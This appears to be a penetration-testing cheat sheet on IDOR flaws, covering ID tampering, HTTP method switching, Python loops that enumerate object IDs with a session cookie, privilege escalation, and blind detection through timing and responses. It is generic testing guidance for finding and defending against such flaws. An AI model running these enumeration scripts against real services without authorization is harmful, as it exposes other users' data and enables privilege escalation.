# IDOR (Insecure Direct Object Reference)

## Detection

### Parameter Tampering
```bash
# User ID manipulation
GET /profile?id=1 → GET /profile?id=2
GET /invoice?id=100 → GET /invoice?id=101

# UUID manipulation
GET /file?id=abc → GET /file?id=xyz
```

### HTTP Method Switching
```bash
# GET → POST
GET /user/1 → POST /user

# PUT → DELETE
GET /resource/1 → DELETE /resource/1
```

## Testing Techniques

### Sequential IDs
```python
for i in range(1, 100):
    response = requests.get(f"/api/data/{i}", cookies=cookies)
    if response.status_code == 200:
        print(f"Accessible: {i}")
```

### UUID Enumeration
```python
import uuid
for _ in range(10):
    id = str(uuid.uuid4())
    response = requests.get(f"/api/data/{id}")
```

## Authorization Testing

### Horizontal Escalation
Access another user's resources at same level:
```
User A accessing User B's data
```

### Vertical Escalation
Access higher privilege resources:
```
Regular user accessing admin data
```

## Blind IDOR

### Time-Based
```bash
# If response time differs based on existence
GET /api/user/99999
GET /api/user/100000
```

### Status Codes
```python
# Consistent response
{"exists": true}
{"exists": false}
```

## Impact Assessment

1. Data theft
2. Privilege escalation
3. Financial impact
4. Compliance violation
